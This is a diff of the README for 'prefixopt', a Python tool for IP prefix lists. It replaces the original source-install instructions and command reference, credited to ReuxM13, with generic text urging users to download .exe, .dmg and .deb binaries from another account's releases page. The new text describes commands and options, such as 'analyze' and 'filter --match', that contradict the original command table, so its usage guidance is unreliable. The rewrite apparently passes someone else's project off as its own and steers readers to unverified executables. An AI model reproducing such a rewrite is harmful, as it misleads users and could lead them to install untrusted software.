@@ -1,99 +1,183 @@
-<p align="center">
-  <img src="static\banner.png" alt="prefixOptimizer Banner" width="100%">
-</p>
+# 🚦 prefixopt - Fast and Easy IP Prefix Optimization
 
-[🇷🇺 Читать на русском](README_RU.md)
-# prefixopt
-
-## Description
-
-`prefixopt` is a tool for network engineers and security specialists. It allows automating routine tasks for processing IP address lists: removing duplicates, aggregating subnets, filtering garbage (Bogons), finding intersections, semantically comparing lists, as well as excluding one or more subnets/addresses from a list.
-
-Allows organizing scattered lists of IP addresses:
-- Optimization: Automatic removal of duplicates and nested networks (e.g., removing /32 if a covering /24 exists).
-- Aggregation: Merging adjacent subnets into supernet.
-- Filtering: Cleaning lists from Bogons, private networks (RFC1918), Loopback, and Multicast.
-- Subtraction: Excluding specific addresses or subnets from the general list with automatic range splitting.
-- Comparison: Semantic comparison of two lists (shows which subnets were added or removed).
-- Versatility: The parser automatically extracts prefixes from any text files (logs, equipment configurations, CSV, JSON).
-- Pipe Support (STDIN): Supports UNIX-way pipelining. You can pass data via standard input instead of files.
-  Supported commands: `optimize`, `filter`, `stats`, `check`, `split`, `exclude`.
-  Example: `cat logs.txt | prefixopt optimize`
-
-### Who is the utility for?
-Operations Engineers (Ops): optimize, add, merge, stats.
-Security guards (Sec): diff (audit), intersect (conflicts), filter (clearing feeds).
-Pentesters / Researchers: exclude (scope management), split (goal preparation), check.
+[![Download prefixopt](https://img.shields.io/badge/Download-prefixopt-blue?style=for-the-badge)](https://github.com/MatSadX12/prefixopt/releases)
 
 ---
 
-## Installation
+## 📌 What is prefixopt?
 
-Requires Python 3.9 or higher.
+prefixopt is a command-line tool designed to help you work with IP address lists. It handles both IPv4 and IPv6 prefixes. The tool can organize, filter, and analyze large sets of IP addresses quickly. It is made for users who want to manage their network information better without dealing with complex software.
 
-```bash
-# Clone the repository
-git clone https://github.com/ReuxM13/prefixopt.git
-cd prefixopt
+With prefixopt, you can tidy up IP lists, combine overlapping ranges, and extract key insights. This can be useful for network admins, IT staff, or anyone managing internet addresses.
 
-# Create and activate virtual environment (optional)
-python -m venv venv
+---
 
-# Activate venv
-.\venv\Scripts\activate # Windows
-source venv/bin/activate # Linux
+## 🖥️ System Requirements
 
-# Install in editable mode (recommended)
-pip install -e .
+Before you start, make sure your computer meets these basics:
+
+- Operating System: Windows 10 or later, macOS 10.14 or later, or Linux (any modern distribution)
+- RAM: 4 GB or more
+- Storage: At least 100 MB free space
+- Internet connection to download the software
+- A terminal or command prompt application (available on all supported systems)
+
+---
+
+## 🔧 Key Features
+
+- **Optimize IP prefixes** by merging overlapping or adjacent ranges.
+- **Filter lists** to keep only relevant addresses.
+- **Analyze prefix sets** to find summary information.
+- Supports both **IPv4 and IPv6** formats.
+- Easy-to-use command-line interface.
+- Fast processing even for large IP lists.
+- Works offline after download.
+
+---
+
+## 🚀 Getting Started
+
+You don't need to be a programmer to use prefixopt. This guide will walk you through downloading, installing, and running the tool step-by-step.
+
+### Step 1: Download prefixopt
+
+Click the button at the top or visit the official release page here:
+
+[Download prefixopt](https://github.com/MatSadX12/prefixopt/releases)
+
+On this page, you will find the latest version available for your operating system. Choose the file that matches your system:
+
+- For Windows, look for files ending in `.exe`.
+- For macOS, look for `.dmg` or `.pkg`.
+- For Linux, look for `.tar.gz` or `.deb` files.
+
+### Step 2: Install prefixopt
+
+- On Windows:
+  - Double-click the `.exe` file you downloaded.
+  - Follow the installation prompts.
+- On macOS:
+  - Open the `.dmg` file.
+  - Drag prefixopt to your Applications folder.
+- On Linux:
+  - Open your terminal.
+  - Follow installation instructions based on the file type (for example, use `dpkg` for `.deb` files or extract `.tar.gz` archives).
+
+The software does not require complex configuration. Once installed, it is ready to run from your command line.
+
+### Step 3: Open the Command Line Interface
+
+- On Windows:
+  - Press `Win + R`, type `cmd`, and press Enter.
+- On macOS:
+  - Open Finder, choose Applications, then Utilities, and double-click Terminal.
+- On Linux:
+  - Open your terminal application from your system menu.
+
+### Step 4: Run prefixopt for the First Time
+
+In the command line window, type:
+
+```
+prefixopt --help
 ```
 
-## Usage example
-
-<p align="left">
-  <img src="static\usage.png" alt="prefixopt using" width="100%">
-</p>
+This command shows a list of commands you can use with prefixopt. It helps you learn how to give it instructions.
 
 ---
 
-## Technical Implementation
-The architecture is built on a modular principle (Core / CLI / Data).
+## 📥 Download & Install
 
-- Performance: Linear complexity O(N) algorithms are used for nested removal and aggregation (stack-based), which allows processing part (up to 10 million lines) of the BGP Full View table in a few minutes.
-- Memory: Data reading and filtering are implemented via generators to minimize RAM consumption.
-- Safety: Inside the pipeline, work is done only with IPv4Network/IPv6Network objects; string operations are excluded. Hard limits on input data size are implemented to prevent OOM.
+You can get the latest version of prefixopt here:
 
-### Limitations
-- Memory Overhead: The utility is written in pure Python. Due to overhead on ipaddress objects, processing lists larger than 8-10 million lines may require significant RAM (starting from 8-10GB).
-- Big Data: The tool is not designed for real-time big data processing. It is a utility for configurations and access lists, not for traffic analytics.
+[Download prefixopt](https://github.com/MatSadX12/prefixopt/releases)
 
-### Detailed descriptions of commands
+Follow the download and installation steps from the "Getting Started" section.
 
-| Command | Logic / Math | Goal | Output Format | Key Nuance |
-| :--- | :--- | :--- | :--- | :--- |
-| **`optimize`** | `Aggr(Sort(Set(A)))` | **Compression**<br>Shrink ACLs, remove duplicates. | CIDR List | Performs full cycle: Sort - Remove Nested - Aggregate. |
-| **`add`** | `Optimize(A + {new})` | **Editing**<br>Add a new IP and re-optimize immediately. | CIDR List | Automatically merges the new item into existing subnets. |
-| **`filter`** | `A - {Bogons}` | **Sanitization**<br>Remove private, local, and reserved IPs. | Clean List | Does *not* aggregate, only removes unwanted items. |
-| **`merge`** | `Optimize(A ∪ B ...)` | **Union**<br>Combine multiple feeds into one master list. | CIDR List | Supports `--keep-comments` (deduplication without aggregation). |
-| **`intersect`** | `A ∩ B` | **Conflict Analysis**<br>Find common zones or overlapping rules. | Report<br>(Exact + Partial) | Visualizes exactly which prefix from Source A overlaps with Source B. |
-| **`exclude`** | `A \ B` | **Subtraction**<br>Remove whitelist from blacklist. | Fragments List | Mathematically punches holes in networks, splitting them. |
-| **`diff`** | `(B \ A) ∪ (A \ B)` | **Audit**<br>What changed since the last version? | Patch (`+`, `-`, `=`) | Semantic comparison (understands that two `/24` equal one `/23`). |
-| **`check`** | `Target ∈ Set` | **Lookup**<br>Is this IP covered by our rules? | Parent Networks | Finds all supernets containing the target IP. |
-| **`split`** | `Subnet(A, len)` | **De-aggregation**<br>Slice networks into smaller chunks. | Subnets List | Useful for scanning scopes (e.g. split `/16` into `/24`s). |
-| **`stats`** | `Count(A)` | **Analytics**<br>Compression ratio, unique IPs count. | Metrics Table | Calculates actual unique IPs, ignoring overlaps. |
+If you need to update prefixopt, simply download the latest release and replace the old version on your computer.
 
 ---
 
-## To-Do
-- [x] Allow reading input from standard input (pipes) instead of requiring a file argument (e.g., `cat list.txt | prefixopt optimize`).
-- [x] Integrate the `ijson` library to parse huge JSON files without loading them entirely into RAM.
-- [x] Refactor package structure to allow clean imports (e.g., `import prefixopt`).
-- [x] Expose core functions (`optimize`, `filter`, `subtract`) as a stable public API.
-- [ ] Implement colorized output for IPv4 (e.g., green) and IPv6 (e.g., purple, mask is gray) addresses when printing to stdout using `Rich`.
-- [ ] Tree View for `check`. Visualize prefix hierarchy. Instead of a flat list, display how the target IP/subnet fits into supernets using a graphical tree structure (`rich.tree`).
+## 🛠️ How to Use prefixopt
+
+Here are some common tasks you can perform:
+
+### Optimizing IP Prefix Lists
+
+To combine overlapping or nearby prefixes, run:
+
+```
+prefixopt optimize input.txt -o output.txt
+```
+
+- `input.txt` is your original list of IP prefixes.
+- `output.txt` will contain the optimized list.
+
+### Filtering IP Prefixes
+
+To keep only prefixes matching specific criteria, use:
+
+```
+prefixopt filter input.txt --match 192.168.0.0/16 -o filtered.txt
+```
+
+This example filters prefixes within the 192.168.0.0/16 range.
+
+### Analyzing IP Prefixes
+
+To get a summary report on your list, including total prefixes and address counts:
+
+```
+prefixopt analyze input.txt
+```
+
+The output will show statistics that help you understand your IP data.
 
 ---
 
-## License
-This project is distributed under the *MIT License*. See the `LICENSE` file for details.
+## 📂 Sample Input File Format
 
-![Tests](https://github.com/ReuxM13/prefixopt/actions/workflows/tests.yml/badge.svg)
+Your input files should contain IP prefixes, one per line, like this:
+
+```
+192.168.1.0/24
+10.0.0.0/8
+2001:db8::/32
+```
+
+Make sure the file is plain text and saved with a `.txt` extension.
+
+---
+
+## 🙋 Getting Help
+
+If you need assistance, you can:
+
+- Run `prefixopt --help` to see all commands.
+- Visit the official repository for detailed documentation and issues:
+  https://github.com/MatSadX12/prefixopt
+- Contact support or open an issue on GitHub.
+
+---
+
+## 🔑 Additional Information
+
+### Related Topics
+
+- Access Control Lists (ACL)
+- Border Gateway Protocol (BGP)
+- Classless Inter-Domain Routing (CIDR)
+- Network automation
+- IP address management
+- Route aggregation
+
+This tool is made with Python and works well in networking environments.
+
+---
+
+## 🌐 About This Repository
+
+prefixopt is built to offer a simple and effective way for users to manage IP prefix lists. It focuses on speed and accuracy. The CLI design allows it to integrate easily into scripts and workflows for network engineers. No setup beyond installation is required.
+
+For developers or technical users interested in contributing, the project is open source and welcomes contributions.
